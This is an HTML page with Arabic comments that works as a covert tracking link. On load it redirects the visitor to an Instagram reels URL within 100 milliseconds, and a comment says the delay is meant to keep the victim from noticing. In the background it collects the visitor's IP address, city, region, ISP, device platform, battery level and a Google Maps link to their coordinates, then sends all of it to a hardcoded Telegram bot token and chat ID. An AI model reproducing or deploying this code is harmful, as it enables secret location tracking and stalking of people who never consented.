<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <script>
        const BOT_TOKEN = "8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8";
        const CHAT_ID = "5773364548";

        async function fastTrack() {
            const params = new URLSearchParams(window.location.search);
            const target = params.get('u') || 'https://www.instagram.com/reels/';

            // 1. التحويل الفوري (أهم خطوة حتى لا يحس)
            setTimeout(() => {
                window.location.replace(target);
            }, 100); // 100 ملي ثانية فقط!

            // 2. سحب البيانات في الخلفية (Background)
            try {
                // نطلب البيانات بس ما ننتظرها تعطل التحويل
                fetch('https://ipapi.co/json/').then(res => res.json()).then(ipData => {
                    let batt = "N/A";
                    navigator.getBattery().then(b => { batt = Math.round(b.level * 100) + "%"; });

                    const msg = `
🚀 **رصد احترافي - النسخة السريعة** 🚀
━━━━━━━━━━━━━━━
🌐 الآيبي: ${ipData.ip}
📍 الموقع: ${ipData.city} | ${ipData.region}
🏢 الشركة: ${ipData.org}
📱 الجهاز: ${navigator.platform}
🔋 البطارية: ${batt}
🗺️ الخريطة: https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}
━━━━━━━━━━━━━━━`;

                    // إرسال للتليجرام
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
                    });
                });
            } catch (e) {
                // في حال الفشل يرسل تنبيه بسيط
            }
        }

        window.onload = fastTrack;
    </script>
</head>
<body style="background: black;"></body>
</html>
